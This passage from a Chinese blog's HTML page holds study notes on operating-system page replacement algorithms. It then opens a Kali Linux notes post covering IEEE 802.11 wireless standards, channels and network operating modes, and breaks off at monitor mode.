-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Operating-System/" itemprop="url" rel="index">
-                    <span itemprop="name">Operating System</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2.9k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  10 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="第三章、页面置换算法"><a href="#第三章、页面置换算法" class="headerlink" title="第三章、页面置换算法"></a>第三章、页面置换算法</h2><hr>
-<ol>
-<li><p>最优页面置换算法（OPT）</p>
-<ul>
-<li>基本思想：当一个缺页中断发生时，对于保存在内存当中的每一个逻辑页面，计算在它的下一次访问之前，还需等待多长时间，从中选择等待时间最长的那个，作为被置换的页面</li>
-<li>这只是一种理想情况。在实际系统中是无法实现的，因为操作系统无从知道每一个页面要等待多长时间以后才会再次访问</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ 可用作其他算法的性能评价的依据（在一个模拟器上运行某个程序，并记录每一次的页面访问情况，在第二遍运行时即可使用最优算法）</code></pre></blockquote>
-<ol start="2">
-<li><p>先进先出算法（First-in-First-out，FIFO）</p>
-<ul>
-<li>基础思想：选择在内存中驻留时间最长的时间的页面并淘汰之。具体来说，系统维护着一个链表，记录了所有位于内存当中的逻辑页面。从链表的排列顺序来看，链首页面驻留的时间最长，链尾页面驻留时间最短。当发生一个缺页中断时，把链首页面淘汰出局，并把新的页面添加到链表的末尾</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ 性能较差，调出的页面有可能时经常要访问的页面，并且有Belady现象。FIFO算法很少单独使用</code></pre></blockquote>
-<ol start="3">
-<li><p>最近最久未使用算法（Least Recently Used，LRU）</p>
-<ul>
-<li>基本思路：当一个缺页中断发生时，选择最久未使用的那个页面，并淘汰</li>
-<li>两种实现方式：<ul>
-<li>系统维护一个页面链表，最近刚刚使用过地页面作为首终点，最久未使用地页面作为尾结点。每一次访问内存时，找到相应地页面，把它从链表中摘下来，再移动到链表之首。每次缺页中断发生时，淘汰链表末尾地页面</li>
-<li>设置一个活动页面栈，当访问某页时，将此页号压入栈顶，然后，考察栈内是否有此页面相同地页号，若有则抽出。当需要淘汰一个页面时，总是选择栈底的底面，它就是最久未使用的</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ 它是对最优页面置换算法的一个近似，其依据是程序的局部性原理，即在最近一小段时间（最近几条指令）内，如果某些页面被频繁地访问，那么在将来地一小段时间内，它们还可能会再一次被频繁地访问。反过来说，如果在过去某些页面长时间未被访问，那么在将来它们还可能会长时间地得不到访问</code></pre></blockquote>
-<ol start="4">
-<li><p>时钟页面置换算法（硬件实现访问位置0/1）(Reigsident bit，used bit，frame number)</p>
-<ul>
-<li>Clock页面置换算法，LRU的近似，用一个bit来模拟，贴近最优的LRU，对FIFO的一种改进</li>
-<li>基本思路：<ul>
-<li>需要用到页表项当中的访问位，当一个页面被装入内存时，把该位初始化为0。然后如果这个页面被访问（读/写），则把该位置为1</li>
-<li>把各个页面组织成环形链表（类似钟表面），把指针指向最老的页面（最先进来）</li>
-<li>当发生一个缺页中断时，考察指针所指向的最老页面，若它的访问位为0，立即淘汰；若访问位为1，则把该位置为0，然后指针往下移动一格。如此下去，直到找到被淘汰的页面，然后把指针移动到它的下一格</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ 维持一个环形页面链表保存在内存中
-1.用一个时钟（或者使用/引用）位来标记一个页面是否经常被访问
-2.当一个页面被引用的时候，这个位被设置（为1）
-
-▲ 时钟头扫遍页面寻找一个带有user bit=0
-替换在一个周转内没有被引用的页面</code></pre></blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">func Clock_Replacement</span><br><span class="line">begin </span><br><span class="line">while  (victim page not found)  do</span><br><span class="line">    if  (used bit for current page=0)   then</span><br><span class="line">            replace current page(&amp;set used bit to 1)</span><br><span class="line">    else</span><br><span class="line">            reset used bit(to 0)</span><br><span class="line">   end if</span><br><span class="line">   advance clock pointer</span><br><span class="line">end while end Clock_Replacement</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li><p>二次机会法（Reigsident bit，used bit，dirty bit）</p>
-<ul>
-<li>这里有一个巨大的代价来替代”脏页“</li>
-<li>修改Clock算法，使它允许脏页总是在一次时钟头扫描中保留下来</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>Before clock sweep                 After clock sweep
-used    dirty                         used    dirty   
-0          0                          replace page
-0          1                          0          0
-1          0                          0          0
-1          1                          0          1
-▲ 注释：同时使用脏位和使用位来指导置换</code></pre></blockquote>
-<ol start="6">
-<li><p>最不常用算法（Least Frequently Used，LFU）</p>
-<ul>
-<li>基本思想：当一个缺页中断发生时，选择访问次数最少的那个页面，并淘汰之</li>
-<li>实现方法：对每个页面设置一个访问计算器，每当一个页面被访问时，该页面的访问计算器加1。在发生缺页中断时，淘汰计数值最小的那个页面。</li>
-<li>LRU和LFU的区别：<ul>
-<li>LRU考察的时多久未访问，时间越短越好</li>
-<li>LFU考察的时访问次数或频度，访问次数越多越好</li>
-</ul>
-</li>
-<li>问题：一个页面在进程开始时使用得很多，但以后就不使用了。实现也费时费力<ul>
-<li>解决方法：定期把次数寄存器右移一位</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ Belady现象、FIFO、LRU和Clock的比较
-1.Belady现象：在采用FIFO算法时，有时会出现分配的物理页面数增加，缺页率反而提高的异常现象
-2.Belady现象的原因：FIFO算法的置换特征与进程访问内存的动态特征是矛盾的，与置换算法的目标是不一致的（即替换较少使用的页面），因此，被它置换出去的页面并不一定是进程不会访问的
-3.LRU、FIFO和Clock的比较
-(1)LRU算法和FIFO本质上都是先进先出的思路，只不过LRU是针对页面的最近访问时间来进行排序，所以需要在每一次页面访问的时候动态地调整各个页面之后的先后顺序（有一个页面的最近访问时间变了）；而FIFO是针对页面进入内存的时间来进行排序，这个时间是固定不变的，所以各页面之间的先后顺序是固定的。如果一个页面在进入内存后没有被访问，那么它的最近访问时间就是它进入内存的时间。换句话说，如果内存当中的所有页面都未曾访问，那么LRU算法退化为FIFO算法
-(2)LRU算法性能较好，但系统开销较大；FIFO算法系统开销较小，但可能会发生Belady现象。因此，折衷的办法就是Clock算法，在每一次页面访问时，它不必去动态地调整该页面在链表当中的顺序，而仅仅是做一个标记，然后等到发生缺页中断的时候，再把它移动到链表末尾。对于内存当中那些未被访问的页面，Clock算法的表先和LRU算法一样好；而对于那些曾经被访问的页面，它不能像LRU算法那样，记住它们的精确位置</code></pre></blockquote>
-<ol start="7">
-<li><p>工作集</p>
-<ul>
-<li>工作集：一个进程当前正在使用的逻辑页面集合，可以用一个二元函数W（t，▲）来表示<ul>
-<li>t是当前的执行时刻</li>
-<li>▲称为工作集窗口（working-set window），即一个定长的页面访问的时间窗口</li>
-<li>W（t，▲）=当前时刻t之前的▲时间窗口当中所有页面所组成的集合（随着t的变化，该集合也在不断地变化）</li>
-<li>|W（t，▲）|指工作集地的大小，即页面数目</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ 工作集大小的变化：进程开始执行后，随着访问新页面逐步建立稳定的工作集。当内存访问的局部性区域的位置大致稳定时，工作集大小也大致稳定；局部性区域的位置改变时，工作集快速扩张和收缩过渡到下一个稳定值</code></pre></blockquote>
-<ol start="8">
-<li><p>常驻集</p>
-<ul>
-<li>常驻集是指在当前时刻，进程实际驻留在内存当中的页面集合<ul>
-<li>工作集是进程在运行过程中固有的性质，而常驻及取决于系统分配给进程的物理页面数目，以及所采用的页面置换算法；</li>
-<li>如果一个进程的整个工作集都在内存当中，即常驻集被包含于工作集，那么进程将很顺利地运行，而不会造成太多地缺页中断（直到工作集发生剧烈变动，从而过渡到另一个状态</li>
-<li>当进程常驻集的大小达到某个数目之后，再给它分配更多的物理页面，缺页率也不会明显下降</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>工作集页置换算法</p>
-<ul>
-<li>超出工作集就替换掉</li>
-</ul>
-</li>
-<li><p>缺页率页面置换算法</p>
-<ul>
-<li>可变分配策略：常驻集大小可变。例如：每个进程在刚开始运行的时候，先根据程序大小给它分配一定数目的物理页面，然后再进程运行过程中，再动态地调整常驻集的大小<ul>
-<li>可采用全局页面置换的方式，当发生一个缺页中断时，被置换的页面可以是在其他进程当中，各个并发进程竞争地使用物理页面</li>
-<li>优缺点：性能较好，但增加了系统开销</li>
-<li>具体实现：可以使用缺页率算法（PFF page of fault frequency）来动态调整常驻集的大小</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ 缺页率：表示“缺页次数/内存访问次数”（比率）或“缺页的评级时间间隔的倒数”。</code></pre></blockquote>
-<ul>
-<li>影响缺页率的因素：<ul>
-<li>页面置换算法</li>
-<li>分配给进程的物理页面算法</li>
-<li>页面本身的大小</li>
-<li>程序的编写方法</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ 一个交替的工作集计算明确的视图最小化页缺失
-1.当缺页率高的时候------增加工作集
-2.当缺页率低的时候------减少工作集</code></pre></blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">算法：</span><br><span class="line">     保持追踪缺失发生概率</span><br><span class="line">          1.当缺失发生时，从上次页缺失起计算这个时间记录这个使劲按，t（last）是上次的页缺失的时间</span><br><span class="line">          2.如果发生页缺失之间的时间是“大”，之后减少工作集</span><br><span class="line">          3.如果t（current）-t（last）&gt;T,之后从内存中移除所有在【t（last），t（current）】时间内没有被引用的页</span><br><span class="line">          4.如果这个发生页缺失的时间是“小”，之后增加工作集</span><br><span class="line">          5.如果t（current）-t（last）&lt;=T，之后增加缺失页到工作集中</span><br></pre></td></tr></table></figure>
-
-<ol start="11">
-<li><p>抖动问题（thrashing）</p>
-<ul>
-<li>如果分配给一个进程的物理页面太少，不能包含整个的工作集，集常驻集被包含于工作集，那么进程将会造成很多的缺页中断，需要频繁地在内存与外存之间替换页面，从而使进程的运行速度变得很慢，我们把这种状态称为“抖动”</li>
-<li>产生的原因：随着驻留内存的进程数目增加，分配给每个进程的物理页面数不断减小，缺页率不断上升。所以OS要选择一个适当的进程数目和进程需要的帧数，以便在并发水平和缺页率之间达到一个平衡</li>
-<li>抖动问题可能会被本地的页面置换改善<ul>
-<li>更好的规则为加载控制：调整MPL，所以：Better criteria for load control：Adjust MPL so that：</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<pre><code>▲ 平均缺页时间（MTBF）=页缺失服务时间（PFST）</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%A0%87%E5%87%86%E3%80%81%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%97%A0%E7%BA%BF%E6%A0%87%E5%87%86%E3%80%81%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/" itemprop="url">Kali Linux笔记(三十四)：无线标准、基本概念以及运行模式</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T23:08:26+08:00">
-                2019-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2.8k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  12 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-无线渗透（WLAN，蓝牙等几米范围内）"><a href="#1-无线渗透（WLAN，蓝牙等几米范围内）" class="headerlink" title="1. 无线渗透（WLAN，蓝牙等几米范围内）"></a>1. 无线渗透（WLAN，蓝牙等几米范围内）</h4><ul>
-<li>与其他章节独立，涵盖面广，可独立成课</li>
-<li>无线技术变化快 难度大</li>
-<li>既新鲜刺激又亚历山大<ul>
-<li>我们不会研究很深</li>
-</ul>
-</li>
-<li>一半理论 一半实践<ul>
-<li>理论是本章最有价值的部分（aircrack-ng suite作者写的一本书）</li>
-</ul>
-</li>
-<li>无线技术是本课程难度最大的一章<ul>
-<li>协议结构</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-无线技术特点（802-11标准）"><a href="#2-无线技术特点（802-11标准）" class="headerlink" title="2. 无线技术特点（802.11标准）"></a>2. 无线技术特点（802.11标准）</h4><ul>
-<li>行业迅猛发展</li>
-<li>互联网的重要入口</li>
-<li>边界模糊</li>
-<li>安全实施缺失而且困难</li>
-<li>对技术不了解而造成配置不当</li>
-<li>企业网络私自接入AP破坏网络边界</li>
-</ul>
-<h4 id="3-IEEE"><a href="#3-IEEE" class="headerlink" title="3. IEEE"></a>3. IEEE</h4><ul>
-<li>Institute of Electrical and Electronics Engineers<ul>
-<li>由通信航天生物电气电子等方面的科学家组成，目的是制定标准，指导行业技术的发展，目前成员近40万人</li>
-</ul>
-</li>
-<li>IEEE分为不同的技术委员会（Committes），其中802委员会负责lan、man标准的制定<ul>
-<li>以太网</li>
-<li>令牌环网</li>
-<li>无线局域网</li>
-<li>网桥</li>
-</ul>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">Working Group</th>
-<th align="center">Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">IEEE 802.1</td>
-<td align="center">Bridging(networking) and Network Management</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.2</td>
-<td align="center">LLC</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.3</td>
-<td align="center">Ethernet（以太网）</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.4</td>
-<td align="center">Token Bus</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.5</td>
-<td align="center">Defines the MAC Layer for a Taken Ring（令牌环网）</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.6</td>
-<td align="center">MANs（成域网）</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.7</td>
-<td align="center">Broadband LAN Using Coaxial Cable（同轴电缆的宽带局域网）</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.8</td>
-<td align="center">Fiber Optic TAG（光纤网）</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.9</td>
-<td align="center">Integrated Services LAN（集成服务的局域网）</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.10</td>
-<td align="center">Interoperable LAN Security</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.11 a/b/g/n</td>
-<td align="center">Wireless LAN(WLAN) and Mesh(Wi-Fi Certification)</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.12</td>
-<td align="center">100BaseVG</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.13</td>
-<td align="center">Unusef</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.14</td>
-<td align="center">Cable Modems</td>
-</tr>
-<tr>
-<td align="center">IEEE 802.15</td>
-<td align="center">Wireless PAN（无线个人局域网络）</td>
-</tr>
-</tbody></table>
-<h4 id="4-无线（802-11标准）"><a href="#4-无线（802-11标准）" class="headerlink" title="4. 无线（802.11标准）"></a>4. 无线（802.11标准）</h4><ul>
-<li>应用层</li>
-<li>表示层</li>
-<li>会话层</li>
-<li>传输层</li>
-<li>网络层</li>
-<li><strong>数据链路层</strong><ul>
-<li><strong>逻辑链路控制子层LLC</strong></li>
-<li><strong>媒体访问控制子层MAC</strong></li>
-</ul>
-</li>
-<li><strong>物理层</strong></li>
-</ul>
-<h4 id="5-IEEE-802-11标准"><a href="#5-IEEE-802-11标准" class="headerlink" title="5. IEEE 802.11标准"></a>5. IEEE 802.11标准</h4><ul>
-<li>802委员会下第11组负责开发无线局域网标准</li>
-<li>IEEE 802.11 The Original WLAN Standard–1Mibt/s and 2Mbit/w，2.4GHz RF and IR</li>
-<li>IEEE 802.11a 54Mbit/s，5GHz</li>
-<li>IEEE 802.11b 802.11 Enhancements to Support 5.5Mbit/s and 11Mbit/s</li>
-<li>IEEE 802.11c Bridge Operation Procedures</li>
-<li>IEEE 802.11d International（Country to Country）Roaming Extensions</li>
-<li>IEEE 802.11e Quality of Service（QoS），Including Packet Bursting</li>
-<li><strong>IEEE 802.11F Inter-Access Point Protocol</strong></li>
-<li>IEEE 802.11g 54Mbit/s，2.4GHz</li>
-<li>IEEE 802.11h Spectrum Managed 802.11a（5GHz）for European Compatibility</li>
-<li>IEEE 802.11i Enhanced Security</li>
-<li>IEEE 802.11j Extensions for Japan</li>
-<li>IEEE 802.11k Radio Resource Measurement Enhancements</li>
-<li>IEEE 802.11n Higher Throughput Using Multiple Input,Multiple Output（MIMO）Antennas</li>
-<li>IEEE 802.11p Wireless Access for the Vehicular Environment（WAVE）</li>
-<li>IEEE 802.11r Fast BSS Transition（FT）</li>
-<li>IEEE 802.11s Mesh Networking，Extended Service Set（ESS）</li>
-<li><strong>IEEE 802.11T Wireless Performance Prediction（WPP）</strong></li>
-<li>IEEE 802.11u Internetworking with Non-802 Networks（i.e.:Cellular）</li>
-<li>IEEE 802.11v Wireless Network Management</li>
-<li>IEEE 802.11w Protected Management Frames</li>
-<li>IEEE 802.11y 3650-3700 MHz Operation in the US</li>
-<li>IEEE 802.11z Direct Link Setup（DLS）Extensions</li>
-<li>IEEE 802.11mb Maintenance of the Standard</li>
-<li>IEEE 802.11aa Robust Streaming of Audio Video Transport Streams</li>
-<li>IEEE 802.11ac Very High Throughput &lt; 6GHz</li>
-<li>IEEE 802.11ad Very High Throughput，60GHz</li>
-<li>IEEE 802.11ae QoS Management</li>
-<li>IEEE 802.11af TV Whitespace</li>
-<li>IEEE 802.11ah Sub 1 GHz</li>
-<li>IEEE 802.11ai Fast Initial Link Setup</li>
-</ul>
-<h4 id="6-日常使用"><a href="#6-日常使用" class="headerlink" title="6. 日常使用"></a>6. 日常使用</h4><ul>
-<li>802.11 – The original WLAN standard</li>
-<li>802.11a – Up to 54 Mbit/s on 5GHz</li>
-<li>802.11b – 5.5Mbit/s and 11Mbit/s on 2.4GHz</li>
-<li>802.11g – Up to 54Mbit/s on 2.4GHz.Backward compatible with 802.11b</li>
-<li>802.11i – Provides enhanced security</li>
-<li>802.11n – Provides higher throughput with Multiple Input/Multiple Output（MIMO）</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">Protocal</th>
-<th align="center">Release Data</th>
-<th align="center">Frequencise</th>
-<th align="center">Rates</th>
-<th align="center">Modulation</th>
-<th align="center">Channel Width</th>
-<th align="center">Notes</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Legacy</td>
-<td align="center">1997</td>
-<td align="center">2.4-25GHz</td>
-<td align="center">1 or 2Mibt</td>
-<td align="center">FHSS/DSSS</td>
-<td align="center">1MHz/20MHZ</td>
-<td align="center">No implementations were made for IR（红外线）</td>
-</tr>
-<tr>
-<td align="center">802.11b(wifi)</td>
-<td align="center">1999</td>
-<td align="center">2.4-2.5GHz</td>
-<td align="center">1,2,5.5,11Mbit</td>
-<td align="center">DSSS</td>
-<td align="center">22MHz</td>
-<td align="center">Proprietary extension:up to 33Mbit</td>
-</tr>
-<tr>
-<td align="center">802.11a</td>
-<td align="center">1999</td>
-<td align="center">5.15-5.25/5.25-5.35/5.725-5.875GHz</td>
-<td align="center">6,9,12,18,24,36,48,54Mbit</td>
-<td align="center">OFDM</td>
-<td align="center">20MHz</td>
-<td align="center">Proprietary extension: up to 108Mbit</td>
-</tr>
-<tr>
-<td align="center">802.11g</td>
-<td align="center">2003</td>
-<td align="center">2.4-2.5GHz</td>
-<td align="center">Same as 802.11a and 802.11b</td>
-<td align="center">DSSS/OFDM</td>
-<td align="center">20MHz/22MHz</td>
-<td align="center">Propritary extension:180Mbit/125Mbit</td>
-</tr>
-<tr>
-<td align="center">802.11n</td>
-<td align="center">2009</td>
-<td align="center">2.4 and /or 5GHz</td>
-<td align="center">Up to 600Mbit</td>
-<td align="center">DSSS/OFDM</td>
-<td align="center">20/20 or 40 MHz</td>
-<td align="center"></td>
-</tr>
-</tbody></table>
-<h4 id="7-802-11"><a href="#7-802-11" class="headerlink" title="7. 802.11"></a>7. 802.11</h4><ul>
-<li>发布于1997年</li>
-<li>速率1Mbps或2Mbps</li>
-<li>红外线传输介质（未实现，传输之间不能有障碍物）</li>
-<li>无线射频信号编码（调制）（radio frequencies，民用2.4-5）<ul>
-<li>Direct-Sequence Spread-Spectrum（DSSS）–直序扩频</li>
-<li>Frequency Hopping Spread-Spectrum（FHSS）–跳频扩频</li>
-</ul>
-</li>
-<li>媒体访问方式–CSMA/CA（载波侦听多路访问冲突避免） c=b+log2（1+s/n）<ul>
-<li>根据算法侦听一定时长</li>
-<li>发生数据前发包声明</li>
-</ul>
-</li>
-<li>Request to Send/Clear to Send（RTS/CTS）</li>
-</ul>
-<h4 id="8-80211b"><a href="#8-80211b" class="headerlink" title="8. 80211b"></a>8. 80211b</h4><ul>
-<li>Complementart Code Keying（CCK）–补充代码键<ul>
-<li>5.5 and 11Mbit/s</li>
-<li>2.4GHz band（2.4GHz-2.485GHz）</li>
-<li>14个重叠的信道channels</li>
-<li>只有三个完全不重叠的信道</li>
-</ul>
-</li>
-<li>美国 1 to 11（2.412GHz–2.462GHz）</li>
-<li>欧洲 1 to 13（2.412GHz–2.472GHz）</li>
-<li>日本 1 to 14（2.412GHz–2.484GHz）</li>
-</ul>
-<blockquote>
-<pre><code>No Overlap
-1、6、11
-2、7、12
-3、8、13
-左右偏移11个单位，同一空间内的AP选择的信道尽量不冲突</code></pre></blockquote>
-<h4 id="9-802-11a"><a href="#9-802-11a" class="headerlink" title="9. 802.11a"></a>9. 802.11a</h4><ul>
-<li>与802.11b几乎同时发布<ul>
-<li>因设备价格问题一直没有得到广泛使用</li>
-</ul>
-</li>
-<li>使用5GHz带宽<ul>
-<li>2.4GHz带宽干扰源多（微波（特别明显）、蓝牙、无绳电话）</li>
-<li>5GHz频率有更多带宽空间，可容纳更多不重叠的信道</li>
-<li>Orthogonal Frequency-Division Multiplexing（OFDM）信号调制方法（正交频分复用技术）</li>
-</ul>
-</li>
-<li>更高速率54Mbps，每个信道20MHz带宽</li>
-<li>变频<ul>
-<li>5.15-5.35GHz室内</li>
-<li>5.7-5.8GHz室外</li>
-</ul>
-</li>
-</ul>
-<h4 id="10-802-11g"><a href="#10-802-11g" class="headerlink" title="10. 802.11g"></a>10. 802.11g</h4><ul>
-<li>2.4GHz频率</li>
-<li>Orthogonal Frequency-Division Multiplexing（OFDM）信号调制方法</li>
-<li>与802.11a速率相同</li>
-<li>可全局降速 向后兼容802.11b，并切换为CCK信号调制方法</li>
-<li>每个信道20/22MHz带宽</li>
-</ul>
-<h4 id="11-802-11n"><a href="#11-802-11n" class="headerlink" title="11. 802.11n"></a>11. 802.11n</h4><ul>
-<li>2.4或5GHz频率<ul>
-<li>300Mbps 最高600Mbps</li>
-<li>Multiple-Input Multiple-Output（MIMO）多进多出通信技术</li>
-<li>多天线，多无线电波，独立收发信号（4条天线）</li>
-<li>可以使用40MHz信道带宽使数据传输速率翻倍</li>
-</ul>
-</li>
-<li>全802.11n设备网络中，可以使用新报文格式，使速率达到最大</li>
-<li>每个信道20/40MHz带宽</li>
-</ul>
-<h4 id="12-无线网络运行模式"><a href="#12-无线网络运行模式" class="headerlink" title="12. 无线网络运行模式"></a>12. 无线网络运行模式</h4><ul>
-<li>无线网络架构</li>
-<li>Infrastructure（基础架构）<ul>
-<li>AP维护SSID</li>
-</ul>
-</li>
-<li>Ad-Hoc<ul>
-<li>STA 维护SSID</li>
-</ul>
-</li>
-<li>Service Set Identifier（SSID，服务级标识符）<ul>
-<li>AP每秒约10次通过Beacon帧广播SSID（Beacon数据包）</li>
-<li>客户端连接到无线网络也会宣告SSID</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>有些AP的隐藏是通过不发送Beacon包来形成的</code></pre></blockquote>
-<h4 id="13-Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）"><a href="#13-Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）" class="headerlink" title="13. Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）"></a>13. Infrastruture（基础架构，不存在STA之间的直接通信，需要把信息发给AP）</h4><ul>
-<li>至少包含一个AP和一个STATION，形成一个Basic Service Set（BSS基本服务集）</li>
-<li>AP连接到有线网络，称为Distribution System（DS）</li>
-<li>连接到同一个DS的多个AP形成一个Entended Service Set（ESS扩展服务集）</li>
-</ul>
-<blockquote>
-<pre><code>BSS的ID：终端设备连接的网卡AP的MAC地址
-ESS的ID：多个AP的SSID保持一致，统一的名字</code></pre></blockquote>
-<h4 id="14-AD-HOC（可以用进行STA之间的直接通信）"><a href="#14-AD-HOC（可以用进行STA之间的直接通信）" class="headerlink" title="14. AD-HOC（可以用进行STA之间的直接通信）"></a>14. AD-HOC（可以用进行STA之间的直接通信）</h4><ul>
-<li>也被称为Independent Basic Service Set（IBSS独立的基本服务集）</li>
-<li>有至少2个STAs直接通信组成</li>
-<li>也称为peer to peer模式（点到点模式）</li>
-<li>其中一个STA负责AP的工作<ul>
-<li>通过beacon广播SSID</li>
-<li>对其他STAs进行身份验证</li>
-</ul>
-</li>
-</ul>
-<h4 id="15-WIRELESS-DISTRIBUTION-SYSTEM（WDS）"><a href="#15-WIRELESS-DISTRIBUTION-SYSTEM（WDS）" class="headerlink" title="15. WIRELESS DISTRIBUTION SYSTEM（WDS）"></a>15. WIRELESS DISTRIBUTION SYSTEM（WDS）</h4><ul>
-<li>与有线DS类视，只是通过无线连接的多个AP组成的网络（没有有线）<ul>
-<li>Bridging（桥接）– 只有AP间彼此通信（终端只能连接一个AP）</li>
-<li>Repeating（中继）– 允许所有AP和STA进行通信（终端可连接多个AP）</li>
-</ul>
-</li>
-</ul>
-<h4 id="16-MONITOR-MODE（无线网络的混杂模式）"><a href="#16-MONITOR-MODE（无线网络的混杂模式）" class="headerlink" title="16. MONITOR MODE（无线网络的混杂模式）"></a>16. MONITOR MODE（无线网络的混杂模式）</h4><ul>
-<li>Monitor不是一种真的无线模式<ul>
